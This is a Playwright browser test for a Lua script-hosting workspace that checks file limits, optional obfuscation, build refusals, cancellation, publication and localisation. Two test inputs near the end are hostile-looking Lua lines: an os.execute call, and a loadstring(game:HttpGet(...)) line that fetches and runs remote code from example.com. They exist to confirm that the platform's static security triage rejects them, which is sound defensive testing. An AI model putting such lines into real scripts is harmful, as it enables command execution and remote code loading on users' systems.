'use strict';
const assert=require('node:assert/strict');
const fs=require('node:fs/promises');
const path=require('node:path');
const {chromium}=require('@playwright/test');
const {startFixture}=require('./tests/platform-fixture');

async function run() {
  const fixture=await startFixture(), browser=await chromium.launch({headless:true});
  const builder=require('./src/services/script-builder'), realBuild=builder.build;
  let checks=0;
  function check(condition,label) { assert.ok(condition,label); checks++; }
  function equal(actual,expected,label) { assert.equal(actual,expected,label); checks++; }
  const context=await browser.newContext({viewport:{width:1440,height:1000},locale:'en-US',reducedMotion:'reduce'});
  const page=await context.newPage(), errors=[], uploads=[], publications=[];
  page.on('pageerror',error=>errors.push(error.message));
  page.on('request',request=>{
    if(request.method()==='PUT' && /\/api\/platform\/projects\/[^/]+\/script$/.test(request.url())) uploads.push(request.postDataJSON());
    if(request.method()==='PUT' && /\/api\/catalog\/projects\/[^/]+$/.test(request.url())) publications.push(request.postDataJSON());
  });
  async function api(endpoint,method='GET',body) {
    const response=await fetch(fixture.base+endpoint,{method,headers:{Cookie:fixture.cookies[0],Origin:fixture.base,...(body===undefined?{}:{'Content-Type':'application/json'})},...(body===undefined?{}:{body:JSON.stringify(body)})});
    const data=await response.json(); assert.ok(response.ok,JSON.stringify(data)); return data;
  }
  async function done(status='Completed',button='#publishScriptBtn') {
    await page.locator('#scriptJobStatus').getByText(status,{exact:true}).waitFor();
    if(status==='Completed' && button==='#publishScriptBtn') await page.locator('#viewScriptOriginal').waitFor({state:'visible'});
    await page.locator(button).waitFor({state:'visible'});
    await page.waitForFunction(selector=>!document.querySelector(selector).disabled,button);
  }
  async function submitBuild(status='Completed',button='#publishScriptBtn') {
    const responsePromise=page.waitForResponse(response=>response.request().method()==='PUT' && /\/api\/(?:platform|catalog)\/projects\//.test(response.url()));
    await page.locator(button).click();
    const response=await responsePromise,data=await response.json();
    assert.ok(response.ok(),JSON.stringify(data));
    assert.ok(data.jobId,'The server returned the new durable job');
    // Consecutive refusals must wait for this job, not the previous Failed label.
    await page.waitForFunction(({id,status})=>document.getElementById('cancelScriptJob').dataset.job===id && document.getElementById('scriptJobStatus').textContent===status,{id:data.jobId,status});
    await done(status,button);
  }
  const work=path.resolve(__dirname,'../work'); await fs.mkdir(work,{recursive:true});
  try {
    await context.addCookies([{name:'ah_session',value:fixture.cookies[0].slice('ah_session='.length),url:fixture.base}]);
    const project=(await api('/api/platform/projects','POST',{name:'Private source test'})).project;
    await page.goto(fixture.base+'/dashboard');
    await page.locator('#workspaceView').waitFor({state:'visible'});
    await page.locator('#cookieConsentReject').click();
    await page.locator('#projectSelect').selectOption(project.id);
    await page.locator('[data-view="script"]').click();
    await page.locator('#scriptContent').waitFor({state:'visible'});
    equal(await page.locator('#scriptObfuscate').isChecked(),false,'Obfuscation starts unchecked');
    equal(await page.locator('#scriptObfuscationOptions').isVisible(),false,'Levels are hidden when protection is off');
    equal(await page.locator('#scriptObfuscate').count(),1,'One protection checkbox exists');
    await page.locator('#scriptContent').focus();await page.keyboard.press('Tab');
    equal(await page.evaluate(()=>document.activeElement.id),'scriptObfuscate','The protection checkbox is reachable by keyboard');
    check(await page.locator('#scriptObfuscate').evaluate(element=>getComputedStyle(element).outlineStyle==='solid' && parseFloat(getComputedStyle(element).outlineWidth)>=2),'Keyboard focus is clearly visible');
    await page.keyboard.press('Space');await page.keyboard.press('Tab');
    equal(await page.evaluate(()=>document.activeElement.id),'scriptObfuscationLevel','The level selector follows the activated checkbox in keyboard order');
    await page.locator('#scriptObfuscate').focus();await page.keyboard.press('Space');
    equal(await page.locator('#scriptObfuscate').isChecked(),false,'Keyboard users can switch protection off again');

    await page.locator('#scriptFile').setInputFiles({name:'large-valid.lua',mimeType:'text/plain',buffer:Buffer.from('--'+ 'a'.repeat(2*1024*1024)+'\nreturn true')});
    await page.getByText('Original ready to upload',{exact:false}).waitFor();
    check((await page.locator('#scriptContent').inputValue()).length>1024*1024,'A valid file above the old 1 MB limit is accepted locally');
    equal(await page.locator('#scriptContent').evaluate(element=>element.validity.valid),true,'A valid UTF-8 source under 8 MiB passes the browser byte check');
    await page.locator('#scriptFile').setInputFiles({name:'bad.lua',mimeType:'text/plain',buffer:Buffer.from([0xff,0xfe,0x61])});
    await page.getByText('Choose a .lua, .luau or .txt file encoded as valid UTF-8.').waitFor();
    equal(await page.locator('#scriptFile').inputValue(),'','Invalid UTF-8 is rejected without upload');
    await page.locator('#scriptFile').setInputFiles({name:'too-large.lua',mimeType:'text/plain',buffer:Buffer.alloc(8*1024*1024+1,97)});
    await page.getByText('The original must be no larger than 8 MiB',{exact:false}).waitFor();
    equal(uploads.length,0,'Oversize and invalid files are not sent to the server');
    await page.locator('#scriptContent').fill('é'.repeat(4*1024*1024+1));
    equal(await page.locator('#scriptContent').evaluate(element=>element.validity.valid),false,'Pasted multibyte UTF-8 is counted by bytes, not characters');

    const source='-- café, private original\r\nlocal greeting = "welcome"\r\nreturn greeting\r\n';
    await page.locator('#scriptFile').setInputFiles({name:'my-release.luau',mimeType:'text/plain',buffer:Buffer.from(source)});
    await page.getByText('Original ready to upload · my-release.luau',{exact:false}).waitFor();
    await submitBuild();
    equal(uploads[0].content,source,'The uploaded file keeps its UTF-8 content and CRLF line endings');
    equal(uploads[0].filename,'my-release.luau','Original filename is sent with the source');
    equal(uploads[0].obfuscate,false,'No client transformation or implicit obfuscation occurs');
    equal(await page.locator('#scriptProtectionBadge').textContent(),'Without obfuscation','The active version accurately shows no protection');
    check((await page.locator('#scriptSourceMeta').textContent()).includes('my-release.luau'),'Owner can see the saved filename and source metadata');
    await page.locator('#viewScriptOriginal').click();
    await page.locator('#scriptOriginalDialog').waitFor({state:'visible'});
    equal(await page.locator('#scriptOriginalContent').inputValue(),source.replaceAll('\r\n','\n'),'Read original shows readable source, not generated code');
    check(await page.locator('#scriptOriginalContent').getAttribute('readonly')!==null,'Original inspection is read only');
    await page.locator('#scriptOriginalDialog [data-close-dialog]').last().click();
    await page.waitForFunction(()=>document.getElementById('scriptOriginalContent').value==='');
    equal(await page.locator('#scriptOriginalContent').inputValue(),'','The source dialog clears its content after closing');
    const downloaded=page.waitForEvent('download'); await page.locator('#downloadScriptOriginal').click();
    const download=await downloaded;
    equal(download.suggestedFilename(),'my-release.luau','Original download retains the file name');
    equal(await fs.readFile(await download.path(),'utf8'),source,'Original download preserves the source bytes');

    await page.locator('#scriptObfuscate').check(); await page.locator('#scriptObfuscationLevel').selectOption('standard');
    await page.locator('#scriptContent').fill('local greeting = "standard private text"\nreturn greeting');
    await submitBuild('Failed');
    equal(uploads[1].obfuscate,true,'Standard protection is submitted only after explicit selection');
    equal(uploads[1].obfuscationLevel,'standard','The selected Standard level reaches the backend');
    check((await page.locator('#scriptJobError').textContent()).includes('SECURITY_UNVERIFIED'),'Opaque Standard output is refused automatically');
    equal(await page.locator('#scriptProtectionBadge').textContent(),'Without obfuscation','Refused Standard output does not replace the active release');
    const beforeStrong=(await api('/api/platform/projects/'+project.id)).script.version;
    await page.locator('#scriptObfuscationLevel').selectOption('strong');
    check((await page.locator('#scriptObfuscationHint').textContent()).includes('pairs/ipairs'),'Strong warns about its iterator restriction');
    await page.locator('#scriptContent').fill('for key, value in pairs({answer=42}) do print(key, value) end');
    await submitBuild('Failed');
    check((await page.locator('#scriptJobError').textContent()).includes('SCRIPT_UNSUPPORTED_STRONG'),'Unsupported Strong syntax produces a clear error');
    equal(await page.locator('#scriptContent').inputValue(),'for key, value in pairs({answer=42}) do print(key, value) end','A failed asynchronous build keeps the editable source draft');
    equal((await api('/api/platform/projects/'+project.id)).script.version,beforeStrong,'A failed Strong job keeps the previous active version');
    check(await page.locator('#scriptJobLogs li').count()>0,'Failed jobs expose dated processing logs to the owner');

    await page.locator('#scriptContent').fill('local amount = 7\nreturn amount + 2');
    await submitBuild('Failed');
    check((await page.locator('#scriptJobError').textContent()).includes('SECURITY_UNVERIFIED'),'Opaque Strong output is refused automatically');
    equal((await api('/api/platform/projects/'+project.id)).script.version,beforeStrong,'Refused Strong output preserves the active version');
    check((await page.locator('#scriptJobDetail').textContent()).includes('→'),'Build activity includes input/output sizes');
    await page.locator('#editScriptOriginal').click();
    await page.getByText('Private original loaded for editing.',{exact:false}).waitFor();
    equal(await page.locator('#scriptContent').inputValue(),source.replaceAll('\r\n','\n'),'Editing restores the last accepted readable original');
    equal(await page.locator('#scriptObfuscate').isChecked(),false,'Editing explicitly resets optional obfuscation to off');
    await page.locator('#scriptContent').fill('local amount = 8\nreturn amount + 2');
    await submitBuild();
    equal(uploads.at(-1).filename,'my-release.luau','Editing and republishing keep the original file metadata');
    equal(uploads.at(-1).obfuscate,false,'Republishing an edited original clears the selected level');

    await page.locator('#scriptObfuscate').check(); await page.locator('#scriptObfuscationLevel').selectOption('standard');
    await page.locator('[data-view="publichub"]').click();
    equal(await page.locator('#scriptObfuscate').count(),1,'Publication shares the existing checkbox instead of duplicating it');
    equal(await page.locator('#scriptObfuscate').isChecked(),true,'The same protection choice follows the user between views');
    equal(await page.locator('#scriptBuildControls').evaluate(element=>element.parentElement.id),'listingBuildControlsSlot','The shared controls are placed in the public form');
    await page.locator('#listingTitle').fill('My tested release');
    await page.locator('#listingDescription').fill('A test release for the isolated browser fixture.');
    const beforePublication=await api('/api/platform/projects/'+project.id+'/jobs?limit=20');
    await submitBuild('Failed','#publishListingBtn');
    check((await page.locator('#scriptJobError').textContent()).includes('SECURITY_UNVERIFIED'),'Opaque public output cannot enter the catalogue');
    equal(publications.at(-1).obfuscate,true,'The public pipeline receives the explicitly chosen protection');
    equal(publications.at(-1).obfuscationLevel,'standard','Publication uses the same Standard level');
    await page.locator('#scriptObfuscate').uncheck();
    await submitBuild('Completed','#publishListingBtn');
    await page.locator('#openPublicListing').waitFor({state:'visible'});
    equal(publications.at(-1).obfuscate,false,'A readable publication passes the automatic pipeline');
    const afterPublication=await api('/api/platform/projects/'+project.id+'/jobs?limit=20');
    equal(afterPublication.jobs.length,beforePublication.jobs.length+2,'Each publication attempt creates one durable job');
    check(afterPublication.jobs.some(job=>job.kind==='publish' && job.status==='succeeded'),'The catalogue is updated by a successful publication job');

    await page.locator('[data-view="script"]').click();
    const beforeCancel=(await api('/api/platform/projects/'+project.id)).script.version;
    // This isolated test pauses one worker invocation to make cancellation
    // deterministic; the real queue, endpoint and transaction still run.
    builder.build=async(_content,options)=>new Promise((resolve,reject)=>{
      const abort=()=>reject(Object.assign(Error('Test build cancelled'),{code:'SCRIPT_CANCELLED'}));
      options.signal.addEventListener('abort',abort,{once:true});
      if(options.signal.aborted) abort();
    });
    await page.locator('#scriptContent').fill('return "cancelled fixture build"');
    await page.locator('#publishScriptBtn').click();
    await page.locator('#cancelScriptJob').waitFor({state:'visible'});
    equal(await page.locator('#publishScriptBtn').isDisabled(),true,'Queued/processing builds disable a duplicate submission');
    let cancellationPrompt='';
    page.once('dialog',async dialog=>{cancellationPrompt=dialog.message();await dialog.accept();});
    await page.locator('#cancelScriptJob').click();
    check(cancellationPrompt.includes('active release'),'Cancellation explains what happens to the active release');
    await page.locator('#scriptJobStatus').getByText('Cancelled',{exact:true}).waitFor(); builder.build=realBuild;
    equal((await api('/api/platform/projects/'+project.id)).script.version,beforeCancel,'Cancellation preserves the active version');

    // Purged historical copies have an explicit unavailable state, while the
    // current original remains reachable through its separate owner endpoint.
    const historical=afterPublication.jobs.find(job=>job.status==='failed');
    await fixture.pool.query('UPDATE developer_script_jobs SET original_content_enc=NULL,original_content_iv=NULL WHERE id=$1',[historical.id]);
    await page.locator('#refreshScriptJobs').click();
    await page.getByText('Historical original no longer available',{exact:true}).waitFor();
    equal(await page.locator('[data-job-source="'+historical.id+'"]').count(),0,'Purged job originals have no misleading download button');
    check(await page.locator('#downloadScriptOriginal').isVisible(),'The current source remains separately downloadable');

    const beforeReview=(await api('/api/platform/projects/'+project.id)).script.version;
    await page.locator('#scriptObfuscate').uncheck();
    await page.locator('#scriptContent').fill('os.execute("DO_NOT_EXECUTE_PRIVATE_PAYLOAD")');
    await submitBuild('Failed');
    check((await page.locator('#scriptJobSecurity').textContent()).includes('process_execution · line 1'),'Rejected releases show the exact safe rule and line');
    check((await page.locator('#scriptJobSecurity').textContent()).includes('not proof of malicious intent'),'Findings explain the limitations of static triage');
    check(!(await page.locator('#scriptJobSecurity').textContent()).includes('DO_NOT_EXECUTE_PRIVATE_PAYLOAD'),'Finding diagnostics never display source contents');
    equal((await api('/api/platform/projects/'+project.id)).script.version,beforeReview,'A rejected release with diagnostics preserves the active build');
    await page.evaluate(()=>document.dispatchEvent(new CustomEvent('audit-hub:language',{detail:{language:'fr'}})));
    check((await page.locator('#scriptJobSecurity').textContent()).includes('ligne 1'),'Finding diagnostics follow the selected French locale');
    await page.evaluate(()=>document.dispatchEvent(new CustomEvent('audit-hub:language',{detail:{language:'en'}})));
    await page.locator('#scriptObfuscate').uncheck();
    await page.locator('#scriptContent').fill('loadstring(game:HttpGet("https://example.com/script.lua"))()');
    await submitBuild('Failed');
    check((await page.locator('#scriptJobSecurity').textContent()).includes('dynamic_code'),'Automatic refusals show safe diagnostic findings');
    check((await page.locator('#scriptJobError').textContent()).includes('SECURITY_UNVERIFIED'),'Remote code cannot be approved manually');
    equal((await api('/api/platform/projects/'+project.id)).script.version,beforeReview,'Automatic refusal preserves the active version');
    await page.locator('#refreshScriptJobs').click();await done('Failed');
    check((await page.locator('#scriptVersion').textContent()).includes('v'+beforeReview),'Refresh cannot activate a refused build');

    await page.evaluate(()=>{localStorage.setItem('audit-hub-language','fr');document.dispatchEvent(new CustomEvent('audit-hub:language',{detail:{language:'fr'}}));});
    equal(await page.locator('#scriptBuildControls legend').textContent(),'Protection de la version','New protection controls translate to French');
    check((await page.locator('#scriptObfuscationHint').textContent()).includes('Standard'),'Level guidance is translated with the selected choice');
    await page.setViewportSize({width:360,height:800});
    equal(await page.evaluate(()=>document.documentElement.scrollWidth>innerWidth+1),false,'Hosting and build history fit a 360 px viewport');
    await page.screenshot({path:path.join(work,'script-hosting-mobile.png'),fullPage:true});
    await page.locator('[data-view="publichub"]').click();
    equal(await page.evaluate(()=>document.documentElement.scrollWidth>innerWidth+1),false,'Publication with shared protection fits 360 px');
    await page.setViewportSize({width:1440,height:1000});await page.locator('[data-view="script"]').click();
    await page.screenshot({path:path.join(work,'script-hosting-desktop.png'),fullPage:true});
    await page.goto(fixture.base+'/docs#obfuscation');
    equal(await page.locator('[data-doc-locale="fr"]').isVisible(),true,'The protection guide follows the saved French language');
    await page.locator('#scriptDocsLanguage').selectOption('en');
    equal(await page.locator('[data-doc-locale="en"]').isVisible(),true,'The guide can switch to English');
    check((await page.locator('.docs-content').textContent()).includes('Based on Prometheus by Elias Oelschner, https://github.com/prometheus-lua/Prometheus'),'Public documentation contains the required attribution');
    check((await page.locator('[data-doc-locale="en"]').textContent()).includes('generic for loops'),'The public guide states Strong compatibility limits');
    await page.setViewportSize({width:360,height:800});
    equal(await page.evaluate(()=>document.documentElement.scrollWidth>innerWidth+1),false,'The bilingual protection guide fits 360 px');
    assert.deepEqual(errors,[],'No JavaScript errors in the new workspace or guide');checks++;
    console.log('Script workspace UI: '+checks+' checks passed (real isolated jobs, UTF-8/8 MiB, defaults, source recovery, levels, failed builds, atomic publication, cancellation, retention and bilingual mobile views).');
  } finally { builder.build=realBuild; await browser.close(); await fixture.close(); }
}
run().catch(error=>{console.error(error.stack);process.exitCode=1;});
